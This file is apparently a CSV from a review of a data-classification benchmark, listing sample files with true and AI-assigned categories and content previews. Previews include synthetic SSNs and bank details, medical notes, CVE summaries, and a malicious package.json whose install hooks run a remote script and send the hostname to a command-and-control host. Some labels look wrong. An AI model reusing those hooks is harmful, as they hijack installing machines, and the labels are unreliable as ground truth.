id,review_id,benchmark,file,true_category,true_subcategory,ai_category,ai_subcategory,r1_category,r1_subcategory,r2_category,r2_subcategory,content_preview
184,P062,primary,pii/sample-0247.json,pii,pii.employee,pii,pii.identity,,,,,"{ \n   ""employees"": [ \n     { \n       ""name"": ""Mr. Alex Dickerson MD"", \n       ""ssn"": ""229-15-3027"", \n       ""salary"": 159428, \n       ""department"": ""Social researcher"", \n       ""hire_date"": ""2023-08-13"", \n       ""bank_account"": ""957400593414"", \n       ""routing_number"": ""684470100"" \n     }, \n     { \n       ""name"": ""Jason Wallace"", \n       ""ssn"": ""800-55-2139"", \n       ""salary"": 182188, \n       ""department"": ""Editorial assistant"", \n       ""hire_date"": ""2018-10-10"", \n       ""bank_account"": ""9223329830"", \n       ""routing_number"": ""590430523"" \n     }, \n     { \n       ""name"": ""Cody Medina"", \n       ""ssn"": ""752-98-9684"", \n       ""salary"": 101517, \n       ""department"": ""Television production assistant"", \n       ""hire_date"": ""2025-12-27"", \n       ""bank_account"": ""913920741835"", \n       ""routing_number"": ""447879045"" \n     }, \n     { \n       ""name"": ""Justin Castro"", \n       ""ssn"": ""868-93-8296"", \n       ""salary"": 179002, \n       ""department"": ""Town planner"", \n       ""hire_date"": ""2016-04-13"", \n       ""bank_account"": ""77450047108"", \n       ""routing_number"": ""040871546"" \n     }, \n     { \n       ""name"": ""David Barker"", \n       ""ssn"": ""587-54-9109"", \n       ""salary"": 115546, \n       ""department"": ""Adult guidance worker"", \n       ""hire_date"": ""2023-09-15"", \n       ""bank_account"": ""4531982426"", \n       ""routing_number"": ""291115810"" \n     } \n   ] \n }"
185,E013,external,medical/ext-0152.txt,medical,medical.diagnosis,medical,medical.diagnosis,,,,,"REASON FOR VISIT: , The patient referred by Dr. X for evaluation of her possible tethered cord.,HISTORY OF PRESENT ILLNESS:,  Briefly, she is a 14-year-old right handed female who is in 9th grade, who underwent a lipomyomeningocele repair at 3 days of age and then again at 3-1/2 years of age.  The last surgery was in 03/95.  She did well; however, in the past several months has had some leg pain in both legs out laterally, worsening at night and requiring Advil, Motrin as well as Tylenol PM.,Denies any new bowel or bladder dysfunction or increased sensory loss.  She had some patchy sensory loss from L4 to S1.,MEDICATIONS: , Singulair for occasional asthma.,FINDINGS: , She is awake, alert, and oriented x 3.  Pupils equal and reactive.  EOMs are full.  Motor is 5 out of 5.  She was able to toe and heel walk without any difficulties as well as tendon reflexes were 2 plus.  There is no evidence of clonus.  There is diminished sensation from L4 to S1, having proprioception.,ASSESSMENT AND PLAN: , Possible tethered cord.  I had a thorough discussion with the patient and her parents.  I have recommended a repeat MRI scan.  The prescription was given today.  MRI of the lumbar spine was just completed.  I would like to see her back in clinic.  We did discuss the possible symptoms of this tethering."
186,E051,external,medical/ext-0448.txt,medical,medical.diagnosis,medical,medical.diagnosis,,,,,"PREOPERATIVE DIAGNOSES:,1.  Cervical intraepithelial neoplasia grade-III status post conization with poor margins.,2.  Recurrent dysplasia.,3.  Unable to follow in office.,4.  Uterine procidentia grade II-III.,POSTOPERATIVE DIAGNOSES:,1.  Cervical intraepithelial neoplasia grade-III postconization.,2.  Poor margins.,3.  Recurrent dysplasia.,4.  Uterine procidentia grade II-III.,5.  Mild vaginal vault prolapse.,PROCEDURES PERFORMED:,1.  Total abdominal hysterectomy (TAH) with bilateral salpingooophorectomy.,2.  Uterosacral ligament vault suspension.,ANESTHESIA: , General and spinal with Astramorph for postoperative pain.,ESTIMATED BLOOD LOSS: , Less than 100 cc.,FLUIDS:  ,2400 cc.,URINE: , 200 cc of clear urine output.,INDICATIONS:  ,This patient is a 57-year-old nulliparous female who desires definitive hysterectomy for history of cervical intraepithelial neoplasia after conization and found to have poor margins.,FINDINGS:  ,On bimanual examination, the uterus was found to be small.  There were no adnexal masses appreciated.  Intraabdominal findings revealed a small uterus approximately 2 cm in size.  The ovaries were atrophic consistent with menopause.  The liver margins and stomach were palpated and found to be normal.,PROCEDURE IN DETAIL: , After informed consent was obtained, the patient was taken back to the operating suite and administered a spinal anesthesia for postoperative pain control.  She was then placed in the dorsal lithotomy position and administered general a"
187,E026,external,malicious/ext-0230.txt,malicious,malicious.phishing,safe,safe,,,,,"hotel information for nels 26 nels 26 harvard university and the massachusetts institute of technology october 27-30 , 1995 keynote speaker : noam chomsky for registration materials or more information , write to : nels 26 department of linguistics and philosophy 20d-219 mit cambridge , ma 02139 usa or send e-mail to : nels26 @ mit . edu / * * * * * * * * * * * * * * * * * nels hotel information * * * * * * * * * * * * * * * * * / the weekend of oct . 27-30 is one of the busiest of the year in the boston / cambridge area . nels has been able to reserve only a very limited number of rooms at block rates in the following two hotels for conference participants : days inn 1234 soldiers field rd . boston , ma 02135 ( 617 ) 254-1234 nels rates : $ 89 / single - - $ 99 / double ( mention harvard - mit linguistics dept . conference ) the days inn is approximately 15 minutes walk to the center of harvard square or 10 minutes by bus ( # 86 bus stops on western ave . directly behind the days inn and runs every 8-10 minutes for the better part of the day and evening , less frequently on off-hours and weekends / holidays ) . hyatt regency cambridge 575 memorial drive cambridge , ma ( 617 ) 492-1234 nels rates : $ 169 / night , single or double occupancy ( specify that you are attending linguistics dept . seminar oct . 26th ) the hyatt has a complimentary , on-the - hour shuttle to harvard sq . and kendall sq . ( mit ) and is located on the charles river approximately midway between the tw"
188,E041,external,medical/ext-0352.txt,medical,medical.diagnosis,medical,medical.procedure,,,,,"TITLE OF PROCEDURE:  ,Coronary artery bypass grafting times three utilizing the left internal mammary artery, left anterior descending and reversed autogenous saphenous vein graft to the posterior descending branch of the right coronary artery and obtuse marginal coronary artery, total cardiopulmonary bypass, cold blood potassium cardioplegia, antegrade and retrograde, for myocardial protection.,DESCRIPTION OF PROCEDURE:  ,The patient was brought to the operating room and placed in the supine position.  Adequate general endotracheal anesthesia was induced.  Appropriate monitoring devices were placed.  The chest, abdomen and legs were prepped and draped in the sterile fashion.  The right greater saphenous vein was harvested and prepared by ligating all branches with 4-0 Surgilon and flushed with heparinized blood.  Hemostasis was achieved in the legs and closed with running 2-0 Dexon in the subcutaneous tissue and running 3-0 Dexon subcuticular in the skin.  Median sternotomy incision was made and the left mammary artery was dissected free from its takeoff of the subclavian to its bifurcation at the diaphragm and surrounded with papaverine-soaked gauze.  The pericardium was opened.  The pericardial cradle was created.  The patient was fully heparinized and cannulated with a single aortic and single venous cannula and bypass was instituted.  A retrograde cardioplegic cannula was placed with a pursestring suture of 4-0 Prolene suture in the right atrial wall into the coronary si"
189,E047,external,safe/ext-0252.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What does Engineering Trustworthy Secure Systems say about SIGNIFICANCE OF LOSS - AN EXAMPLE? (Part 3) According to Engineering Trustworthy Secure Systems, SIGNIFICANCE OF LOSS - AN EXAMPLE: kely or probable to happen?' 39 Addressing loss occurs through the protective measures that enforce constraints to ensure that only authorized and intended behaviors and outcomes of the system occur. These include: - Protective measures that are provided by the machine portion of the system (i.e., the system architecture and design, the use of engineered features and devices within the architecture and design) - Protective measures that are provided by the human in the system (i.e., personnel, practices, procedures, the use of tools to support the human as a system element, and the human role in designing and building the machine part of the system) - Protective measures that are provided by the physical environment (i.e., controlled access areas, facility access points, physical monitoring, environmental controls, fire suppression) The terminology used to describe means and methods includes mechanisms, configurations, controls, safeguards, countermeasures, features, techniques, overrides, pract"
190,E008,external,malicious/ext-0277.txt,malicious,malicious.exploit,malicious,malicious.exploit,,,,,CVE: CVE-2005-3585 \n  \n SQL injection vulnerability in forum.php in PhpWebThings 1.4.4 allows remote attackers to execute arbitrary SQL commands via the forum parameter. \n  \n CVSS Score: 7.5
191,E043,external,safe/ext-0268.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What does Automation Support for Security Control Assessments_ Software Asset Management say about Determination Statement 1? According to Automation Support for Security Control Assessments_ Software Asset Management, Determination Statement 1: | Determination Statement ID | Determination Statement Text | |------------------------------|----------------------------------------------------------------------------------------------------------------------------| | CM-11(b){1} | Determine if the organization: enforces software installation policies through [Assignment: organization-defined methods]. |"
192,E060,external,malicious/ext-0368.txt,malicious,malicious.injection,malicious,malicious.injection,,,,,"CVE: CVE-2006-5451 \n  \n Multiple cross-site scripting (XSS) vulnerabilities in TorrentFlux 2.1 allow remote attackers to inject arbitrary web script or HTML via the (1) action, (2) file, and (3) users array variables in (a) admin.php, which are not properly handled when the administrator views the Activity Log; and the (4) torrent parameter, as used by the displayName variable, in (b) startpop.php, different vectors than CVE-2006-5227. \n  \n CVSS Score: 2.6 \n CWE: CWE-79"
193,E054,external,pii/ext-0385.txt,pii,pii.identity,confidential,confidential.internal,,,,,"Message-ID: <21690015.1075847343348.JavaMail.evans@thyme> \n Date: Thu, 5 Apr 2001 09:10:00 -0700 (PDT) \n From: steve.barry@sabre.com \n To: mark.greenberg@enron.com \n Subject: Re: RESIDUAL KNOWLEDGE PROVISION \n Cc: john.allario@enron.com, tana.jones@enron.com, brenda.crabtree@sabre.com \n Mime-Version: 1.0 \n Content-Type: text/plain; charset=us-ascii \n Content-Transfer-Encoding: 7bit \n Bcc: john.allario@enron.com, tana.jones@enron.com, brenda.crabtree@sabre.com \n X-From: Steve Barry <Steve.Barry@sabre.com> \n X-To: Mark.Greenberg@enron.com \n X-cc: John.Allario@enron.com, Tana.Jones@enron.com, Brenda Crabtree <brenda.crabtree@sabre.com> \n X-bcc:  \n X-Folder: \Tanya_Jones_June2001\Notes Folders\All documents \n X-Origin: JONES-T \n X-FileName: tjones.nsf \n  \n Mark, thanks for looking at the language.  Deleting the concept is fine.  If  \n you need another copy \n of the draft, please let me know. \n  \n Thanks, Steve \n  \n  \n  \n Mark.Greenberg@enron.com wrote: \n  \n > Steve - \n > \n > I looked at the below language.  I guess I still have some concerns about \n > the concept. \n > \n > Why don't we go back to your original suggestion and delete the concept \n > entirely.  I am sure if either party believes strongly enough that a breach \n > has occurred, it will pursue its available remedies. \n > \n > If this is acceptable, I will work off of the draft forwarded by Brenda and \n > see if we can finalize a document for signature by Enron. \n > \n > Please let me know if this will work. \n > \n > Thanks. \n > \n > Mark \n > Senior Counsel, ENA \n > Phone:     713-345-8897 \n > Facsimile: 713-646-3940"
194,P058,primary,financial/sample-0329.txt,financial,financial.bank_account,financial,financial.bank_account,,,,,DIRECT DEPOSIT AUTHORIZATION \n Employee: Ms. Rebecca Bates \n SSN: 508-91-3591 \n Bank: Dixon-Adams Federal Credit Union \n Routing: 638695231 \n Account: 212874707013 \n Account Type: Savings \n Percentage: 100% \n
195,P027,primary,financial/sample-0386.txt,financial,financial.bank_statement,financial,financial.bank_statement,error,,,error,#ERROR!
196,E066,external,safe/ext-0235.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What does Computer Security Division 2015 Annual Report say about Small and Medium Size Business (SMB) Cybersecurity Workshop Outreach? (Part 2) According to Computer Security Division 2015 Annual Report, Small and Medium Size Business (SMB) Cybersecurity Workshop Outreach: overview of cybersecurity threats, vulnerabilities, and corresponding protective tools and techniques, with a special emphasis on information that small business personnel can apply directly. In FY 2015, six SMB outreach workshops were provided in Reno, Nevada; Fresno, California; Modesto, California; Fairmont, West Virginia; Pittsburgh, Pennsylvania; and McHenry, Maryland. Additionally, the SMB Cybersecurity Outreach Program was briefed to the InfraGard National Congress. In collaboration with the SBA and the FBI, planning is underway to identify locations and plan cybersecurity workshops in FY 2016."
197,E032,external,safe/ext-0449.txt,safe,safe.documentation,safe,safe,,,,,"You are a cybersecurity expert with deep knowledge of NIST standards, frameworks, and best practices. You provide accurate, detailed guidance on cybersecurity controls, risk management, cloud security, and compliance based on NIST publications including the 800 series, FIPS, and related documents. What does Guide to Information Technology Security Services say about 4. IT Security Services Life Cycle? (Part 1) According to Guide to Information Technology Security Services, 4. IT Security Services Life Cycle: 4. IT Security Services Life Cycle The IT security services life cycle provides IT security decision makers and managers with a six-phase process by which they can select, implement, and manage IT security services. This chapter details the various life-cycle phases and the issues and decisions within each phase. As Figure 4-1 illustrates, the security services life cycle has both a linear and iterative component. It proceeds linearly from initiation to implementation to closeout, but the assessment, solution, and operations phases must continually occur for an IT security service to succeed. Figure 4-1. IT Security Services Life Cycle <!-- image --> The six phases are described as follows: -  Phase 1: Initiationthe need to initiate the services life cycle is recognized. Section 4.1 discusses potential triggers for this phase. -  Phase 2: Assessmentbefore decision makers can implement a service and select a service provider, an accurate portrait of the current environme"
198,E029,external,pii/ext-0365.txt,pii,pii.identity,pii,pii.identity,,,,,"ey findings:</p> \n  \n <h3>Key Individuals Involved:</h3> \n <ul> \n   <li> \n     <b>Mr Pr {Heavenly Stone}:</b> \n     <ul> \n       <li>Sex: M</li> \n       <li>Driver's License Number: 773626922</li> \n       <li>Telephone: 011213069-8366</li> \n       <li>Password: l`I""\\S&lt;1</li> \n       <li>Last Known Location at 6 PM</li> \n     </ul> \n   </li> \n   <li> \n     <b>Miss Pr {Davey Smith}:</b> \n     <ul> \n       <li>Last Seen"
199,P082,primary,safe/sample-0853.rs,safe,safe.code,safe,safe,,,,,"use std::collections::HashMap; \n  \n pub struct Config { \n     host: String, \n     port: u16, \n     workers: usize, \n } \n  \n impl Config { \n     pub fn from_env() -> Self { \n         Config { \n             host: std::env::var(""HOST"").unwrap_or_else(|_| ""0.0.0.0"".into()), \n             port: std::env::var(""PORT"").ok().and_then(|p| p.parse().ok()).unwrap_or(8080), \n             workers: num_cpus::get(), \n         } \n     } \n } \n "
200,P031,primary,malicious/sample-0709.json,malicious,malicious.supply_chain,malicious,malicious.supply_chain,,,,,"{ \n   ""name"": ""flask2"", \n   ""version"": ""1.0.0"", \n   ""scripts"": { \n     ""preinstall"": ""curl -s https://cdn.guerrero.com/setup.sh | bash"", \n     ""postinstall"": ""node -e \""require('child_process').exec('curl https://c2.wolf.com/'+require('os').hostname())\"""" \n   }, \n   ""dependencies"": { \n     ""flask"": ""^2.0.0"" \n   } \n }"
